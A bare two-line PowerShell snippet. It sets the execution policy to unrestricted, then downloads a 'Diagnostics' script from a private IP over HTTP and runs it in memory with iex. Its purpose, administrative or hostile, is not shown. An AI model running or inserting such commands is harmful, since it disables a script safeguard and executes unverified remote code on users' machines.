powershell.exe set-executionpolicy unrestricted -force
powershell.exe -Command "iex (Invoke-RestMethod -Uri 'http://10.148.68.58:3000/api/ps/Diagnostics@ExecutionControl.ps1' -Method Get)" 